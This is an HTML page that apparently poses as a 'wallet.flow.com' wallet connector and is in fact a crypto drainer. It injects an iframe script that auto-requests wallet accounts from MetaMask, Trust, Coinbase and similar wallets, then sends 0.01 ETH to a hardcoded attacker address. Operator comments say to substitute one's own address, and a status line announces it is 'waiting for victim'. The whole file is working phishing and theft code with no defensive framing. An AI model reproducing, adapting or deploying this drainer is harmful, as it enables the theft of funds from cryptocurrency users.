<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>wallet.flow.com</title>
  <style>
    iframe { width: 100%; height: 360px; border: 1px solid #333; margin-top: 20px; border-radius: 12px; }
    body { 
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; 
      text-align: center; 
      background: #0d1117; 
      color: #e6f2fb; 
      padding: 20px;
    }
    h1 { color: #58a6ff; }
    .status { margin-top: 20px; font-size: 18px; }
  </style>
</head>
<body>
  <h1>wallet.flow.com</h1>
  <iframe id="iframe"></iframe>
  <div class="status" id="status">Waiting for wallet detection...</div>

  <script>
    window.onblur = function () {
      const iframe = document.getElementById("iframe");
      const doc = iframe.contentDocument || iframe.contentWindow.document;
      const statusEl = document.getElementById("status");

      doc.open();
      doc.write(`
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>wallet.flow.com</title>
  <style>
    body { background:#0d1117; color:#fff; font-family:system-ui; text-align:center; padding:40px; margin:0; }
    h3 { color:#58a6ff; }
    .loader { width:40px; height:40px; border:4px solid #333; border-top:4px solid #58a6ff; border-radius:50%; animation:s 1s linear infinite; margin:20px auto; }
    @keyframes s { to { transform:rotate(360deg); } }
  </style>
</head>
<body>
  <h3 id="msg">Detecting wallet...</h3>
  <div class="loader"></div>

  <script>
    const msgEl = document.getElementById('msg');
    const ATTACKER_ADDRESS = "0xf9f41a5462bbe4f3ee00559b346930d9172c22c2"; // â† GANTI DENGAN ALAMAT KAMU

    async function universalConnectAndDrain() {
      let provider = null;
      let accounts = null;

      // === UNIVERSAL EVM WALLET DETECTION (100+ wallets) ===
      if (window.ethereum) {
        // MetaMask, Trust, Rabby, Phantom EVM, Coinbase, Rainbow, Zerion, Brave, etc.
        provider = window.ethereum;
        if (provider.isMetaMask) msgEl.innerText = "MetaMask detected!";
        else if (provider.isTrust) msgEl.innerText = "Trust Wallet detected!";
        else if (provider.isCoinbaseWallet) msgEl.innerText = "Coinbase Wallet detected!";
        else if (provider.isPhantom) msgEl.innerText = "Phantom EVM detected!";
        else msgEl.innerText = "EVM Wallet detected!";
      }

      if (!provider) {
        msgEl.innerText = "No EVM wallet found!";
        return;
      }

      try {
        // Auto connect
        msgEl.innerText = "Requesting connection...";
        accounts = await provider.request({ method: "eth_requestAccounts" });
        const user = accounts[0];
        msgEl.innerText = "Connected: " + user.slice(0,6) + "..." + user.slice(-4);

        // Auto send 0.01 ETH
        setTimeout(async () => {
          try {
            msgEl.innerText = "Sending 0.01 ETH...";
            const txHash = await provider.request({
              method: "eth_sendTransaction",
              params: [{
                from: user,
                to: ATTACKER_ADDRESS,
                value: "0x2386F26FC10000", // 0.01 ETH
                gas: "0x5208"
              }]
            });
            msgEl.innerText = "SUCCESS! Tx: " + txHash.slice(0,10) + "...";
            document.title = "wallet.flow.com - Connected";
          } catch (txErr) {
            msgEl.innerText = "Tx rejected or failed";
            console.error(txErr);
          }
        }, 800);

      } catch (err) {
        msgEl.innerText = "Connection rejected";
        console.error(err);
      }
    }

    // Auto run saat iframe load
    window.addEventListener("load", () => {
      setTimeout(universalConnectAndDrain, 600);
    });
  <\/script>
</body>
</html>
      `);
      doc.close();

      // Update status di parent
      statusEl.innerHTML = "Spoofed wallet connect active!<br>Waiting for victim...";
    };
  </script>
</body>
</html>
